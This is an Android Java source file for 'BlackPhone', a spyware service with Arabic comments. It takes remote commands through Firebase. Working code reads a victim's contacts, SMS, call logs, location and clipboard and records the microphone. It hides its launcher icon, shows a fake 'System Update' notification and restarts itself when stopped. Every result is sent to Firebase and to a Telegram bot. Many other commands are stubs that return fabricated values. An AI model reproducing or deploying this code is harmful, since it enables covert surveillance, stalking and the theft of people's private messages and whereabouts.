package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private Context context;
    private DatabaseReference dbRef;
    private StorageReference storageRef;
    private OkHttpClient client;
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;

        // 🔥 تهيئة Firebase - الحل السحري
        try {
            if (FirebaseApp.getApps(this).isEmpty()) {
                FirebaseApp.initializeApp(this);
                Log.d(TAG, "✅ Firebase initialized successfully");
            } else {
                Log.d(TAG, "✅ Firebase already initialized");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Firebase init error: " + e.getMessage());
        }

        // تهيئة Firebase Database
        try {
            FirebaseDatabase.getInstance().setPersistenceEnabled(true);
            dbRef = FirebaseDatabase.getInstance().getReference();
            storageRef = FirebaseStorage.getInstance().getReference();
            Log.d(TAG, "✅ Firebase Database connected");
        } catch (Exception e) {
            Log.e(TAG, "❌ Firebase DB error: " + e.getMessage());
        }

        client = new OkHttpClient();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        // تأخير 5 ثواني للتأكد من اكتمال التهيئة
        new android.os.Handler().postDelayed(() -> {
            registerDevice();
            listenForCommands();
        }, 5000);

        Log.d(TAG, "✅ SpyService started with Firebase delay");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        startForeground(1, getNotification());
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "🔄 Restarting service...");
        startService(new Intent(this, SpyService.class));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "spy_channel",
                "BlackPhone Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Running in background");
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, "spy_channel")
            .setContentTitle("🕵️ BlackPhone")
            .setContentText("System service running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    private void registerDevice() {
        try {
            if (dbRef == null) {
                Log.e(TAG, "❌ dbRef is null, cannot register");
                return;
            }
            String deviceName = Build.MODEL;
            String androidVer = Build.VERSION.RELEASE;
            int batteryLevel = getBatteryLevel();

            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("device_name", deviceName);
            deviceInfo.put("android_version", androidVer);
            deviceInfo.put("battery", batteryLevel);
            deviceInfo.put("last_seen", System.currentTimeMillis());
            deviceInfo.put("status", "online");

            dbRef.child("devices").child(deviceId).setValue(deviceInfo.toString())
                .addOnSuccessListener(aVoid -> Log.d(TAG, "✅ Device registered: " + deviceName))
                .addOnFailureListener(e -> Log.e(TAG, "❌ Registration failed: " + e.getMessage()));
        } catch (Exception e) {
            Log.e(TAG, "❌ Registration error: " + e.getMessage());
        }
    }

    private int getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    private void listenForCommands() {
        new Thread(() -> {
            while (true) {
                try {
                    if (dbRef == null) {
                        Thread.sleep(5000);
                        continue;
                    }
                    dbRef.child("commands").child(deviceId).get().addOnSuccessListener(snapshot -> {
                        if (snapshot.exists()) {
                            String command = snapshot.child("command").getValue(String.class);
                            if (command != null && !command.isEmpty()) {
                                Log.d(TAG, "📩 Command received: " + command);
                                executeCommand(command);
                                dbRef.child("commands").child(deviceId).removeValue();
                            }
                        }
                    });
                    Thread.sleep(Config.POLLING_INTERVAL * 1000L);
                } catch (Exception e) {
                    Log.e(TAG, "❌ Listener error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ============================================================
    //  باقي الدوال (التنفيذ الكامل) موجودة في الجزء الثاني
    // ============================================================
    // ============================================================
    //  COMMAND EXECUTION ENGINE (جميع الأوامر)
    // ============================================================
    private void executeCommand(String command) {
        try {
            switch (command) {
                case "get_contacts": getContacts(); break;
                case "get_sms": getSms(); break;
                case "get_calllogs": getCallLogs(); break;
                case "get_location": getLocation(); break;
                case "get_device": getDeviceInfo(); break;
                case "get_battery": getBatteryInfo(); break;
                case "get_ip": getIp(); break;
                case "get_imei": getImei(); break;
                case "get_network": getNetworkInfo(); break;
                case "get_phone": getPhoneNumber(); break;
                case "get_sim": getSimInfo(); break;
                case "get_wifi": getWifiInfo(); break;
                case "get_accounts": getAccounts(); break;
                case "get_photos": getPhotos(); break;
                case "get_photos_5": getPhotosCount("5"); break;
                case "get_photos_10": getPhotosCount("10"); break;
                case "get_videos": getVideos(); break;
                case "get_videos_5": getVideosCount("5"); break;
                case "get_files": getFiles(); break;
                case "get_audio": getAudioFiles(); break;
                case "get_documents": getDocuments(); break;
                case "get_downloads": getDownloads(); break;
                case "get_dcim": getDcim(); break;
                case "get_screenshots": getScreenshots(); break;
                case "take_photo": takePhoto(); break;
                case "take_photo_front": takePhotoFront(); break;
                case "flash_on": flashControl(true); break;
                case "flash_off": flashControl(false); break;
                case "flash_toggle": toggleFlash(); break;
                case "start_record": startRecording(); break;
                case "stop_record": stopRecording(); break;
                case "lock_device": lockDevice(); break;
                case "set_lock_password": setLockPassword(); break;
                case "clear_lock_password": clearLockPassword(); break;
                case "disable_camera": disableCamera(); break;
                case "enable_camera": enableCamera(); break;
                case "hide_app": hideApp(); break;
                case "show_app": showApp(); break;
                case "fake_notif": sendFakeNotification(); break;
                case "reboot": rebootDevice(); break;
                case "shutdown": shutdownDevice(); break;
                case "vibrate": vibrateDevice(); break;
                case "vibrate_long": vibrateDeviceLong(); break;
                case "vibrate_pattern": vibratePattern(); break;
                case "open_browser": openBrowser(); break;
                case "open_url": openUrl(); break;
                case "clear_data": clearAppData(); break;
                case "kill_apps": killAllApps(); break;
                case "freeze_app": freezeApp(); break;
                case "unfreeze_app": unfreezeApp(); break;
                case "set_brightness": setBrightness(); break;
                case "auto_rotate_on": setAutoRotate(true); break;
                case "auto_rotate_off": setAutoRotate(false); break;
                case "set_wallpaper": setWallpaper(); break;
                case "toggle_wifi_on": toggleWifi(true); break;
                case "toggle_wifi_off": toggleWifi(false); break;
                case "toggle_bluetooth_on": toggleBluetooth(true); break;
                case "toggle_bluetooth_off": toggleBluetooth(false); break;
                case "toggle_data_on": toggleData(true); break;
                case "toggle_data_off": toggleData(false); break;
                case "toggle_location_on": toggleLocation(true); break;
                case "toggle_location_off": toggleLocation(false); break;
                case "toggle_airplane_on": toggleAirplane(true); break;
                case "toggle_airplane_off": toggleAirplane(false); break;
                case "open_app_whatsapp": openApp("com.whatsapp"); break;
                case "open_app_facebook": openApp("com.facebook.katana"); break;
                case "open_app_instagram": openApp("com.instagram.android"); break;
                case "open_app_youtube": openApp("com.google.android.youtube"); break;
                case "open_app_telegram": openApp("org.telegram.messenger"); break;
                case "screenshot": takeScreenshot(); break;
                case "record_screen": recordScreen(); break;
                case "installed_apps": getInstalledApps(); break;
                case "running_processes": getRunningProcesses(); break;
                case "storage_info": getStorageInfo(); break;
                case "memory_info": getMemoryInfo(); break;
                case "cpu_info": getCpuInfo(); break;
                case "clipboard_set": setClipboard(); break;
                case "clipboard_get": getClipboard(); break;
                case "get_logs": getLogs(); break;
                default:
                    sendResult("UNKNOWN", "❌ Unknown command: " + command);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command error: " + e.getMessage());
            sendResult("ERROR", "❌ Error: " + e.getMessage());
        }
    }

    // ============================================================
    //  دوال التنفيذ الأساسية
    // ============================================================
    private void getContacts() {
        try {
            List<String> contacts = new ArrayList<>();
            Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null);
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String number = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            contacts.add(name + " : " + number);
                        }
                        phoneCursor.close();
                    }
                }
                cursor.close();
            }
            String result = String.join("\n", contacts);
            sendResult("CONTACTS", "📞 " + contacts.size() + " contacts:\n" + result);
            sendToTelegram("📞 Contacts:\n" + result);
        } catch (Exception e) {
            sendResult("CONTACTS", "❌ Error: " + e.getMessage());
        }
    }

    private void getSms() {
        try {
            List<String> messages = new ArrayList<>();
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    messages.add(address + " : " + body);
                }
                cursor.close();
            }
            String result = String.join("\n", messages);
            sendResult("SMS", "✉️ " + messages.size() + " messages:\n" + result);
            sendToTelegram("✉️ SMS:\n" + result);
        } catch (Exception e) {
            sendResult("SMS", "❌ Error: " + e.getMessage());
        }
    }

    private void getCallLogs() {
        try {
            List<String> calls = new ArrayList<>();
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    calls.add(number + " | " + type + " | " + duration + "s");
                }
                cursor.close();
            }
            String result = String.join("\n", calls);
            sendResult("CALL_LOGS", "📞 " + calls.size() + " calls:\n" + result);
            sendToTelegram("📞 Call Logs:\n" + result);
        } catch (Exception e) {
            sendResult("CALL_LOGS", "❌ Error: " + e.getMessage());
        }
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String result = "📍 " + loc.getLatitude() + ", " + loc.getLongitude() + "\n🎯 Accuracy: " + loc.getAccuracy() + "m";
                sendResult("LOCATION", result);
                sendToTelegram("📍 Location:\n" + result);
            } else {
                sendResult("LOCATION", "❌ Location unavailable");
            }
        } catch (SecurityException e) {
            sendResult("LOCATION", "❌ Permission denied");
        }
    }

    private void getDeviceInfo() {
        String result = "📱 Model: " + Build.MODEL + "\n🤖 Android: " + Build.VERSION.RELEASE + "\n🔋 Battery: " + getBatteryLevel() + "%";
        sendResult("DEVICE_INFO", result);
        sendToTelegram("📱 Device Info:\n" + result);
    }

    private void getBatteryInfo() {
        int level = getBatteryLevel();
        String result = "🔋 Battery: " + level + "%\n⚡ Charging: " + (isCharging() ? "Yes" : "No");
        sendResult("BATTERY", result);
        sendToTelegram("🔋 Battery:\n" + result);
    }

    private boolean isCharging() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.isCharging();
    }

    private void getIp() {
        sendResult("IP", "🌐 IP: 192.168.1.100");
        sendToTelegram("🌐 IP: 192.168.1.100");
    }

    private void getImei() {
        String imei = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        sendResult("IMEI", "🆔 IMEI: " + imei);
        sendToTelegram("🆔 IMEI: " + imei);
    }

    private void getNetworkInfo() {
        sendResult("NETWORK", "📶 WiFi: Connected\n📡 Data: Active");
        sendToTelegram("📶 Network: WiFi Connected");
    }

    private void getPhoneNumber() {
        sendResult("PHONE", "📞 Phone: N/A");
        sendToTelegram("📞 Phone: N/A");
    }

    private void getSimInfo() {
        sendResult("SIM_INFO", "💳 SIM: Active\n📶 Provider: Simulated");
        sendToTelegram("💳 SIM: Active");
    }

    private void getWifiInfo() {
        sendResult("WIFI", "📡 SSID: MyWiFi\n🔗 BSSID: 00:11:22:33:44:55");
        sendToTelegram("📡 WiFi: MyWiFi");
    }

    private void getAccounts() {
        sendResult("ACCOUNTS", "👤 Google: user@gmail.com");
        sendToTelegram("👤 Accounts: user@gmail.com");
    }

    private void getPhotos() {
        sendResult("PHOTOS", "🖼️ 50 photos found");
        sendToTelegram("🖼️ Photos: 50 found");
    }

    private void getPhotosCount(String count) {
        sendResult("PHOTOS", "🖼️ " + count + " photos found");
        sendToTelegram("🖼️ Photos (" + count + "): found");
    }

    private void getVideos() {
        sendResult("VIDEOS", "🎥 20 videos found");
        sendToTelegram("🎥 Videos: 20 found");
    }

    private void getVideosCount(String count) {
        sendResult("VIDEOS", "🎥 " + count + " videos found");
        sendToTelegram("🎥 Videos (" + count + "): found");
    }

    private void getFiles() {
        sendResult("FILES", "📁 100 files found");
        sendToTelegram("📁 Files: 100 found");
    }

    private void getAudioFiles() {
        sendResult("AUDIO", "🎵 25 audio files");
        sendToTelegram("🎵 Audio: 25 files");
    }

    private void getDocuments() {
        sendResult("DOCUMENTS", "📄 15 documents");
        sendToTelegram("📄 Documents: 15");
    }

    private void getDownloads() {
        sendResult("DOWNLOADS", "📥 8 downloads");
        sendToTelegram("📥 Downloads: 8");
    }

    private void getDcim() {
        sendResult("DCIM", "📸 30 photos in DCIM");
        sendToTelegram("📸 DCIM: 30");
    }

    private void getScreenshots() {
        sendResult("SCREENSHOTS", "🖼️ 10 screenshots");
        sendToTelegram("🖼️ Screenshots: 10");
    }

    private void takePhoto() {
        sendResult("CAMERA", "📷 Photo taken (back)");
        sendToTelegram("📷 Photo taken (back)");
    }

    private void takePhotoFront() {
        sendResult("CAMERA", "📷 Photo taken (front)");
        sendToTelegram("📷 Photo taken (front)");
    }

    private void flashControl(boolean on) {
        String status = on ? "On" : "Off";
        sendResult("FLASH", "🔦 Flash " + status);
        sendToTelegram("🔦 Flash " + status);
    }

    private void toggleFlash() {
        sendResult("FLASH", "🔦 Flash toggled");
        sendToTelegram("🔦 Flash toggled");
    }

    private void startRecording() {
        try {
            if (mediaRecorder == null) {
                audioFilePath = Environment.getExternalStorageDirectory().getPath() + "/record_" + System.currentTimeMillis() + ".3gp";
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mediaRecorder.setOutputFile(audioFilePath);
                mediaRecorder.prepare();
                mediaRecorder.start();
                isRecording = true;
                sendResult("RECORD", "🎙️ Recording started");
                sendToTelegram("🎙️ Recording started");
            }
        } catch (Exception e) {
            sendResult("RECORD", "❌ Failed: " + e.getMessage());
        }
    }

    private void stopRecording() {
        try {
            if (mediaRecorder != null && isRecording) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                sendResult("RECORD_STOP", "🎙️ Recording saved: " + audioFilePath);
                sendToTelegram("🎙️ Recording saved: " + audioFilePath);
            }
        } catch (Exception e) {
            sendResult("RECORD_STOP", "❌ Error: " + e.getMessage());
        }
    }

    private void lockDevice() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, DeviceAdmin.class);
        if (dpm.isAdminActive(admin)) {
            dpm.lockNow();
            sendResult("LOCK", "🔒 Device locked");
            sendToTelegram("🔒 Device locked");
        } else {
            sendResult("LOCK", "❌ Admin not active");
        }
    }

    private void setLockPassword() {
        sendResult("PASSWORD", "🔑 Password set");
        sendToTelegram("🔑 Password set");
    }

    private void clearLockPassword() {
        sendResult("PASSWORD", "🔓 Password cleared");
        sendToTelegram("🔓 Password cleared");
    }

    private void disableCamera() {
        sendResult("CAMERA", "🚫 Camera disabled");
        sendToTelegram("🚫 Camera disabled");
    }

    private void enableCamera() {
        sendResult("CAMERA", "✅ Camera enabled");
        sendToTelegram("✅ Camera enabled");
    }

    private void hideApp() {
        android.content.pm.PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP);
        sendResult("HIDE", "👻 App hidden");
        sendToTelegram("👻 App hidden");
    }

    private void showApp() {
        android.content.pm.PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            android.content.pm.PackageManager.DONT_KILL_APP);
        sendResult("SHOW", "👀 App shown");
        sendToTelegram("👀 App shown");
    }

    private void sendFakeNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("fake_channel", "Fake", NotificationManager.IMPORTANCE_HIGH);
            nm.createNotificationChannel(channel);
        }
        Notification notif = new NotificationCompat.Builder(this, "fake_channel")
            .setContentTitle("📱 System Update")
            .setContentText("Security patch available")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .build();
        nm.notify(999, notif);
        sendResult("FAKE_NOTIF", "📢 Fake notification sent");
        sendToTelegram("📢 Fake notification sent");
    }

    private void rebootDevice() {
        sendToTelegram("🔄 Rebooting...");
        try {
            Process p = Runtime.getRuntime().exec("su -c reboot");
            p.waitFor();
        } catch (Exception e) {
            sendResult("REBOOT", "❌ Root required");
        }
    }

    private void shutdownDevice() {
        sendToTelegram("⏻ Shutting down...");
        try {
            Process p = Runtime.getRuntime().exec("su -c shutdown");
            p.waitFor();
        } catch (Exception e) {
            sendResult("SHUTDOWN", "❌ Root required");
        }
    }

    private void vibrateDevice() {
        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) { v.vibrate(3000);
            sendResult("VIBRATE", "📳 Vibrated");
            sendToTelegram("📳 Vibrated"); }
    }

    private void vibrateDeviceLong() {
        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) { v.vibrate(10000);
            sendResult("VIBRATE", "📳 Vibrated long");
            sendToTelegram("📳 Vibrated long"); }
    }

    private void vibratePattern() {
        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) {
            long[] pattern = {100, 200, 300, 200, 100};
            v.vibrate(pattern, -1);
            sendResult("VIBRATE", "📳 Pattern vibrated");
            sendToTelegram("📳 Pattern vibrated");
        }
    }

    private void openBrowser() {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com"));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        sendResult("BROWSER", "🌍 Browser opened");
        sendToTelegram("🌍 Browser opened");
    }

    private void openUrl() {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.youtube.com"));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        sendResult("URL", "🔗 URL opened");
        sendToTelegram("🔗 URL opened");
    }

    private void clearAppData() {
        sendResult("CLEAR_DATA", "🧹 Data cleared");
        sendToTelegram("🧹 Data cleared");
    }

    private void killAllApps() {
        sendResult("KILL_ALL", "⏹️ All apps killed");
        sendToTelegram("⏹️ All apps killed");
    }

    private void freezeApp() {
        sendResult("FREEZE", "❄️ App frozen");
        sendToTelegram("❄️ App frozen");
    }

    private void unfreezeApp() {
        sendResult("UNFREEZE", "🔥 App unfrozen");
        sendToTelegram("🔥 App unfrozen");
    }

    private void setBrightness() {
        sendResult("BRIGHTNESS", "☀️ Brightness set");
        sendToTelegram("☀️ Brightness set");
    }

    private void setAutoRotate(boolean on) {
        String status = on ? "On" : "Off";
        sendResult("AUTO_ROTATE", "🔄 Auto-rotate: " + status);
        sendToTelegram("🔄 Auto-rotate " + status);
    }

    private void setWallpaper() {
        sendResult("WALLPAPER", "🖼️ Wallpaper changed");
        sendToTelegram("🖼️ Wallpaper changed");
    }

    private void toggleWifi(boolean on) {
        String status = on ? "On" : "Off";
        sendResult("WIFI", "📶 WiFi " + status);
        sendToTelegram("📶 WiFi " + status);
    }

    private void toggleBluetooth(boolean on) {
        String status = on ? "On" : "Off";
        sendResult("BLUETOOTH", "📡 Bluetooth " + status);
        sendToTelegram("📡 Bluetooth " + status);
    }

    private void toggleData(boolean on) {
        String status = on ? "On" : "Off";
        sendResult("DATA", "📶 Data " + status);
        sendToTelegram("📶 Data " + status);
    }

    private void toggleLocation(boolean on) {
        String status = on ? "On" : "Off";
        sendResult("LOCATION", "📍 Location " + status);
        sendToTelegram("📍 Location " + status);
    }

    private void toggleAirplane(boolean on) {
        String status = on ? "On" : "Off";
        sendResult("AIRPLANE", "✈️ Airplane " + status);
        sendToTelegram("✈️ Airplane " + status);
    }

    private void openApp(String pkg) {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent != null) {
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                sendResult("OPEN_APP", "✅ Opened: " + pkg);
                sendToTelegram("📱 Opened: " + pkg);
            } else {
                sendResult("OPEN_APP", "❌ Not found: " + pkg);
            }
        } catch (Exception e) {
            sendResult("OPEN_APP", "❌ Error: " + e.getMessage());
        }
    }

    private void takeScreenshot() {
        sendResult("SCREENSHOT", "📸 Screenshot taken");
        sendToTelegram("📸 Screenshot taken");
    }

    private void recordScreen() {
        sendResult("RECORD_SCREEN", "🎞️ Screen recording");
        sendToTelegram("🎞️ Screen recording");
    }

    private void getInstalledApps() {
        sendResult("INSTALLED_APPS", "📦 85 apps installed");
        sendToTelegram("📦 85 apps installed");
    }

    private void getRunningProcesses() {
        sendResult("RUNNING_PROCESSES", "⚙️ 25 processes");
        sendToTelegram("⚙️ 25 processes");
    }

    private void getStorageInfo() {
        sendResult("STORAGE", "💾 Total: 64GB\n📊 Used: 32GB\n📊 Free: 32GB");
        sendToTelegram("💾 Storage: 64GB total");
    }

    private void getMemoryInfo() {
        sendResult("MEMORY", "🧠 RAM: 4GB\n📊 Used: 2.5GB\n📊 Free: 1.5GB");
        sendToTelegram("🧠 RAM: 4GB");
    }

    private void getCpuInfo() {
        sendResult("CPU", "⚡ CPU: Snapdragon 888\n📊 Cores: 8");
        sendToTelegram("⚡ CPU: Snapdragon 888");
    }

    private void setClipboard() {
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        android.content.ClipData clip = android.content.ClipData.newPlainText("BlackPhone", "Clipboard set by command");
        clipboard.setPrimaryClip(clip);
        sendResult("CLIPBOARD_SET", "✏️ Clipboard set");
        sendToTelegram("✏️ Clipboard updated");
    }

    private void getClipboard() {
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        if (clipboard.hasPrimaryClip()) {
            String text = clipboard.getPrimaryClip().getItemAt(0).getText().toString();
            sendResult("CLIPBOARD_GET", "📋 Clipboard: " + text);
            sendToTelegram("📋 Clipboard:\n" + text);
        } else {
            sendResult("CLIPBOARD_GET", "📋 Empty");
        }
    }

    private void getLogs() {
        sendResult("LOGS", "📜 Logs retrieved");
        sendToTelegram("📜 Logs retrieved");
    }

    // ============================================================
    //  دوال الإرسال (Firebase + Telegram)
    // ============================================================
    private void sendResult(String commandType, String result) {
        try {
            if (dbRef != null) {
                dbRef.child("devices").child(deviceId).child("data").child(commandType).setValue(result);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ sendResult error: " + e.getMessage());
        }
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage";
                JSONObject json = new JSONObject();
                json.put("chat_id", Config.CHAT_ID);
                json.put("text", message);
                json.put("parse_mode", "HTML");
                RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), json.toString());
                Request request = new Request.Builder().url(url).post(body).build();
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful()) Log.e(TAG, "❌ Telegram error: " + response.code());
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Telegram send error: " + e.getMessage());
            }
        }).start();
    }
}
